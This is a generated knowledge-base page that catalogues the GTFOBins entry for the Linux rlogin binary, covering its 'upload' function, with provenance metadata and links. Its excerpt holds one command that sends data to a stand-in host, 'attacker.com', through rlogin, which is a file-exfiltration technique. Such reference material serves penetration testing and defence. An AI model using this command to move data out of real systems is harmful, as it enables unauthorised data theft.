---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# rlogin

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `rlogin` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rlogin` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for rlogin covering upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/rlogin.md)
- Source verification: [source record](../../sources/gtfobins/rlogin.md)

## Aliases

- `rlogin`

## Source Verification

[source record](../../sources/gtfobins/rlogin.md)

## Evidence Excerpt

```text
_body: ''
_name: rlogin
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rlogin
functions:
upload:
- binary: false
code: rlogin -l DATA -p 12345 attacker.com
comment: The file is corrupted by leading and trailing spurious data.
```
